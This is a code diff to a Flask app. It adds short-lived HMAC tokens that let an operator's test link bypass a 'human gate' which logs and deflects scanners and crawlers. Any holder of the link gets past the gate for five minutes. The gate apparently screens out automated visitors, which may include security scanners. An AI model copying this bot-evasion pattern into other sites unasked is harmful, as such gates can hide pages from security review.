@@ -260,6 +260,28 @@ def log_bot_hit(client_ip, user_agent, bot_type="scanner", host=None, path=None)
     except Exception:
         pass
 
+def generate_op_test_token():
+    """Generate a short-lived HMAC token for operator link testing (5 min validity)."""
+    expiry = int(time.time()) + 300  # 5 minutes
+    payload = f"op_test:{expiry}"
+    sig = hmac.new(GATE_SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()[:24]
+    return f"{expiry}:{sig}"
+
+def _verify_op_test_token(tok):
+    """Verify an operator test token is valid and not expired."""
+    if not tok or ':' not in tok:
+        return False
+    try:
+        expiry_str, sig = tok.split(':', 1)
+        expiry = int(expiry_str)
+        if time.time() > expiry:
+            return False
+        payload = f"op_test:{expiry}"
+        expected = hmac.new(GATE_SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()[:24]
+        return hmac.compare_digest(sig, expected)
+    except Exception:
+        return False
+
 def require_human_gate(f):
     """Flask route decorator requiring verified client browser environment."""
     @wraps(f)
@@ -269,6 +291,17 @@ def require_human_gate(f):
 
         client_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
         user_agent = request.headers.get('User-Agent', '')
+
+        # ── Operator test bypass ──────────────────────────────────────
+        # When an authenticated operator clicks "▶ Test" in the admin panel,
+        # the link includes ?_op_tok=<signed_token>.  We verify the HMAC to
+        # confirm this is a legitimate operator test (works across domains).
+        op_tok = request.args.get('_op_tok', '')
+        if op_tok and _verify_op_test_token(op_tok):
+            token = generate_gate_token(client_ip, user_agent)
+            resp = make_response(f(*args, **kwargs))
+            resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax')
+            return resp
 
         # Deflect known automated crawlers immediately
         if is_known_bot(user_agent):
